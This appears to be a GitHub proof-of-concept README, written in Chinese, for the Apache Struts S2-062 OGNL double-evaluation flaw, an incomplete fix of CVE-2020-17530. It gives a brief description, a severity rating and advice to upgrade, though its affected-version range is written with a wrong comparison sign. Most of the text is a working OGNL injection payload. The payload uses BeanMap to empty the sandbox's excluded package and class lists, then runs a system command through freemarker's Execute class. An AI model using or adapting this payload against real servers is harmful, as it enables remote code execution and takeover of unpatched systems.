# S2-62poc


# 漏洞简介
针对 CVE-2020-17530 发布的修复不完整。因此，从 Apache Struts 2.0.0 到 2.5.29，如果开发人员通过使用 %{…} 语法应用强制 OGNL 评估，仍然有一些标签的属性可以执行双重评估。对不受信任的用户输入使用强制 OGNL 评估可能会导致远程代码执行漏洞。

# 漏洞危害
高危

# 漏洞影响版本范围
2.0.0 ≤ Apache Struts ≥2.5.29

# 漏洞已修复的版本
Struts ≥ 2.5.30的版本不受影响

# 漏洞修复方法
目前官方已发布最新版本，建议受影响的用户及时更新升级到最新版本，下载链接：

https://struts.apache.org/download.cgi#struts-ga

# poc 
-----

(#request.map=#@org.apache.commons.collections.BeanMap@{}).toString().substring(0,0) +
(#request.map.setBean(#request.get('struts.valueStack')) == true).toString().substring(0,0) +
(#request.map2=#@org.apache.commons.collections.BeanMap@{}).toString().substring(0,0) +
(#request.map2.setBean(#request.get('map').get('context')) == true).toString().substring(0,0) +
(#request.map3=#@org.apache.commons.collections.BeanMap@{}).toString().substring(0,0) +
(#request.map3.setBean(#request.get('map2').get('memberAccess')) == true).toString().substring(0,0) +
(#request.get('map3').put('excludedPackageNames',#@org.apache.commons.collections.BeanMap@{}.keySet()) == true).toString().substring(0,0) +
(#request.get('map3').put('excludedClasses',#@org.apache.commons.collections.BeanMap@{}.keySet()) == true).toString().substring(0,0) +
(#application.get('org.apache.tomcat.InstanceManager').newInstance('freemarker.template.utility.Execute').exec({'id'}))

-----

<img width="655" alt="image" src="https://user-images.githubusercontent.com/59011386/163543243-75d0c081-7b85-4a59-8b96-eaafdb0c18a4.png">
